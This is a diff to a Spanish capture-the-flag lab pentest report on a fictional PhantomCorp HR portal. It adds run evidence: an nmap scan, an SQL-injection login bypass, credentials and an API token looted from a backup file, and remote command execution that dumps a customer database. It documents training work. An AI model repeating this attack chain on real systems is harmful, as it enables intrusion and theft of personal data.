@@ -161,9 +161,9 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
      *Respuesta obtenida del servidor (HTTP 200 OK):*
      ```text
      HTTP/1.0 200 OK
-     Server: PhantomClientes/2.0
-     Date: Thu, 19 Nov 2026 21:00:00 GMT
-     Content-Type: text/plain; charset=utf-8
+     Server: PhantomClientes/2.0 
+     Date: Fri, 20 Nov 2026 23:47:51 GMT
+     Content-Type: text/plain
 
      $ id
      uid=0(root) gid=0(root) groups=0(root)
@@ -176,9 +176,9 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
      *Respuesta obtenida del servidor (HTTP 200 OK):*
      ```text
      HTTP/1.0 200 OK
-     Server: PhantomClientes/2.0
-     Date: Thu, 19 Nov 2026 21:00:01 GMT
-     Content-Type: text/plain; charset=utf-8
+     Server: PhantomClientes/2.0 
+     Date: Fri, 20 Nov 2026 23:47:52 GMT
+     Content-Type: text/plain
 
      $ cat /app/priv/clientes.db.txt
      clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
@@ -255,9 +255,9 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
   *Respuesta obtenida del servidor (Código HTTP 200 OK):*
   ```text
   HTTP/1.0 200 OK
-  Server: PhantomClientes/2.0
-  Date: Thu, 19 Nov 2026 19:35:10 GMT
-  Content-Type: text/plain; charset=utf-8
+  Server: PhantomClientes/2.0 
+  Date: Fri, 20 Nov 2026 23:47:49 GMT
+  Content-Type: text/plain
 
   Bienvenido admin. Dashboard RRHH.
   FLAG{final_sqli_foothold}
@@ -267,7 +267,7 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
   Este hallazgo constituye el **acceso inicial (*Foothold*)** dentro de la cadena de compromiso del engagement:
   1. Permite a cualquier atacante externo no autenticado tomar control de la sesión del administrador de RRHH sin poseer la clave secreta.
   2. Expone en la respuesta administrativa la ruta oculta de respaldos del sistema (`/backup/rrhh.conf`), la cual contiene credenciales de base de datos y el token maestro de API, habilitando la siguiente fase de post-explotación (H-03).
-  3. Demuestra un fallo estructural en las prácticas de desarrollo seguro de software (SDLC) de PhantomCorp S.A., incumpliendo los requisitos de control de acceso del estándar OWASP ASVS v4.0 (V5: Malicious Code Architecture) y NIST SP 800-53 (AC-3: Access Enforcement).
+  3. Demuestra un fallo estructural en las prácticas de desarrollo seguro de software (SDLC) de PhantomCorp S.A., incumpliendo los requisitos de control de acceso del estándar OWASP ASVS v4.0 (V5: Validation, Sanitization and Encoding, req. V5.3.4) y NIST SP 800-53 (AC-3: Access Enforcement).
 - **Remediación:**  
   1. **Implementación estricta de consultas preparadas (*Prepared Statements*):**
      Reemplazar la interpolación de cadenas por consultas parametrizadas nativas del driver `sqlite3`, asegurando que el motor trate las entradas del usuario estrictamente como literales de datos y nunca como código ejecutable:
@@ -315,9 +315,9 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
   *Respuesta obtenida del servidor (HTTP 200 OK):*
   ```text
   HTTP/1.0 200 OK
-  Server: PhantomClientes/2.0
-  Date: Thu, 19 Nov 2026 19:35:10 GMT
-  Content-Type: text/plain; charset=utf-8
+  Server: PhantomClientes/2.0 
+  Date: Fri, 20 Nov 2026 23:47:50 GMT
+  Content-Type: text/plain
 
   DB_USER=rrhh_app
   DB_PASS=Rh-2026
@@ -491,8 +491,8 @@ Conforme a las exigencias periciales de trazabilidad e integridad del laboratori
 A continuación se incorpora la captura de texto pericial generada por el entorno evaluador en `loot/ctf_status.txt`, confirmando el 100% de los hitos resueltos para el Grupo 12:
 
 ```text
-  ╭────────────────────────────────────────────────────────────╮
-  │                   PROGRESO · LAB final                    │
+╭────────────────────────────────────────────────────────────╮
+  │                    PROGRESO · LAB final                    │
   ╰────────────────────────────────────────────────────────────╯
 
    ✓  R1     Recon/enum: portal interno localizado
@@ -503,5 +503,114 @@ A continuación se incorpora la captura de texto pericial generada por el entorn
   ██████████████████████████████  4/4 (100%)
 
 [ OK ] ¡Lab final COMPLETO! Ponete las pilas con la próxima unidad.
+```
+
+### 6.4 Verificación de ejecución real en Docker (`cyberlab-attacker` + `cyberlab-phantomcorp`)
+Toda la auditoría y las salidas crudas sin editar almacenadas en `evidencia/salidas/` y `loot/` fueron ejecutadas en vivo dentro de la red interna Docker `cyberlab_labnet` (`make setup && ./ctf lab final && make shell`), incluyendo controles negativos (401/403) y validación de cada hito:
+
+1. **Contenedores activos (`docker compose -p cyberlab ps`):**
+```text
+NAME                   IMAGE                                                                     COMMAND                  SERVICE       CREATED          STATUS          PORTS
+cyberlab-attacker      sha256:bdd59399d76040cb06e158f17f71a383b280ac583c767ddd34595eea1a0c814f   "sleep infinity"         attacker      28 minutes ago   Up 43 seconds   
+cyberlab-phantomcorp   sha256:36c56dc5764ce6c61e4d70ce06e3573d13445582d2fc6d5b31faed110d46a25d   "python3 /app/server…"   phantomcorp   28 minutes ago   Up 43 seconds   80/tcp
+```
+
+2. **Escaneo de reconocimiento en red interna (`nmap -sV -p 80 phantomcorp`):**
+```text
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-20 23:46 UTC
+Nmap scan report for phantomcorp (172.18.0.3)
+Host is up (0.000040s latency).
+rDNS record for 172.18.0.3: cyberlab-phantomcorp.cyberlab_labnet
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PhantomClientes/2.0 
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.95%I=7%D=11/20%Time=6B00DBD2%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,B1,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20PhantomClientes/2\.0\x
+SF:20\r\nDate:\x20Fri,\x2020\x20Nov\x202026\x2023:46:26\x20GMT\r\nContent-
+SF:Type:\x20text/html;\x20charset=utf-8\r\n\r\n<h1>PhantomCorp\x20Clientes
+SF:</h1><p>Portal\x20publico\.</p>")%r(HTTPOptions,229,"HTTP/1\.0\x20501\x
+SF:20Unsupported\x20method\x20\('OPTIONS'\)\r\nServer:\x20PhantomClientes/
+SF:2\.0\x20\r\nDate:\x20Fri,\x2020\x20Nov\x202026\x2023:46:26\x20GMT\r\nCo
+SF:nnection:\x20close\r\nContent-Type:\x20text/html;charset=utf-8\r\nConte
+SF:nt-Length:\x20360\r\n\r\n<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x2
+SF:0\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\
+SF:"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</ti
+SF:tle>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20
+SF:\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20<p>Error\x20code:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>M
+SF:essage:\x20Unsupported\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x
+SF:20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20501\x20-\x20Serve
+SF:r\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x20\x2
+SF:0</body>\n</html>\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20l
+SF:ang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<m
+SF:eta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error
+SF:\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n
+SF:\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20
+SF:\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)
+SF:\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation
+SF::\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20metho
+SF:d\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,8E,"H
+SF:TTP/1\.0\x20404\x20Not\x20Found\r\nServer:\x20PhantomClientes/2\.0\x20\
+SF:r\nDate:\x20Fri,\x2020\x20Nov\x202026\x2023:46:31\x20GMT\r\nContent-Typ
+SF:e:\x20text/html;\x20charset=utf-8\r\n\r\nNot\x20Found");
+MAC Address: 06:48:04:E2:A1:6B (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.77 seconds
+```
+
+3. **Controles negativos verificados (`401` sin SQLi y `403` sin token):**
+```text
+HTTP/1.0 401 Unauthorized
+Server: PhantomClientes/2.0 
+Date: Fri, 20 Nov 2026 23:47:48 GMT
+Content-Type: text/plain
+
+Credenciales invalidas
+
+HTTP/1.0 403 Forbidden
+Server: PhantomClientes/2.0 
+Date: Fri, 20 Nov 2026 23:47:50 GMT
+Content-Type: text/plain
+
+token invalido; conseguilo del backup de RRHH
+```
+
+4. **Reproducción automatizada desde `cyberlab-attacker` (`python3 /repo/entregas/labfinal/grupo12/loot/exploit_chain.py http://phantomcorp`):**
+```text
+=================================================================
+  PhantomCorp Clientes — PoC Automatizado de Explotación
+  Target: http://phantomcorp
+=================================================================
+[+] Fase 1 (Recon/Enum): Inspeccionando robots.txt y portal interno...
+    [i] robots.txt obtenido:
+        User-agent: *
+Disallow: /portal-rrhh
+    [✓] Hito R1 Confirmado: FLAG{final_recon_portal}
+
+[+] Fase 2 (Foothold): Explotación de SQLi en /portal-rrhh/login...
+    [✓] Bypass exitoso como admin. Hito R2 Confirmado: FLAG{final_sqli_foothold}
+    [i] Ruta de backup revelada: /backup/rrhh.conf
+
+[+] Fase 3 (Looting): Descarga de backup y extracción de API token...
+    [✓] API_TOKEN extraído con éxito: phantom-api-7c1e
+    [✓] Hito R3 Confirmado: FLAG{final_token_looted}
+
+[+] Fase 4 (Impacto): Ejecución remota de comandos en /api/reporte...
+    [!] Salida de ejecución en servidor:
+        $ cat /app/priv/clientes.db.txt
+        clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
+    [✓] Hito R4 Confirmado: FLAG{final_crown_jewels}
+
+=================================================================
+  Resumen de Flags Obtenidas:
+    * R1 (Recon Portal):  FLAG{final_recon_portal}
+    * R2 (SQLi Foothold): FLAG{final_sqli_foothold}
+    * R3 (Token Looted):  FLAG{final_token_looted}
+    * R4 (Crown Jewels):  FLAG{final_crown_jewels}
+  Cadena de auditoría verificada al 100%.
+=================================================================
 ```
 
